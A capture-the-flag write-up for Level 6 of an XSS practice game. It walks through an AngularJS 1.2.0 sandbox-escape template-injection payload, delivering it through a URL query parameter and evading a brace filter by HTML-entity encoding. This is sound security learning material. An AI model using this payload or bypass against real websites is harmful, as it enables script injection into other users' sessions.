# XSS Game Write-Up: Level 6

![Image](https://github.com/user-attachments/assets/d334b0e7-27aa-4619-9908-2ed3d1fd54ac)

After entering the challenge, I followed the same steps I did in Level 5, which was to check the version of AngularJS. This time, I found it was an older version: **AngularJS v1.2.0**. So, I started looking for XSS vulnerabilities in this version and what payload I could use to exploit it. After some searching, I found this payload: 

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

![Image](https://github.com/user-attachments/assets/791736b8-9a6f-4d5f-98ee-fdc74aed9f7d)


I tried putting it in the search input, but it just rendered as a string and didn't execute or do anything.  

![Image](https://github.com/user-attachments/assets/bd0d88ad-c649-43b3-9e14-fe01bda67460)

So, I went back to the source code and noticed that the search form was using the POST method:

```html
<form action="/f/rWKWwJGnAeyi/" method="POST">
  <input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">
  <input id="demo2-button" type="submit" value="Search">
</form>
```

I thought, "Okay, what if I want to make the method GET so that it takes the payload from the URL?" What could I do? I saw that the search input has a name attribute, which is "query". What if I made this name a parameter in the URL and gave it the payload as its value? Would the server accept it, read it, and understand it? I decided to give it a try.

I added the attribute to the URL like this:
```
?query={{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

Nothing happened on the page, but when I checked the source code, I saw that what I wrote was reflected in the form's action, and the method turned to GET:

```html
<form action="/f/rWKWwJGnAeyi/?query=a='constructor';b=};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}" method="GET">
```

But when I opened the browser's dev tools, I noticed that the server understood the GET request, but it filtered out the }} characters.

![Image](https://github.com/user-attachments/assets/4ba21823-d3d4-4065-bad0-3b03c4739539)
 so what about replacing `{ `to `&lcub`
making the payload look like this:
```ruby
?query=&lcub;&lcub;a='constructor';b=&lcub;&rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()}}
```

And it worked!

![Image](https://github.com/user-attachments/assets/672d32b9-32e7-4ec6-840f-2f1f62403bf2)
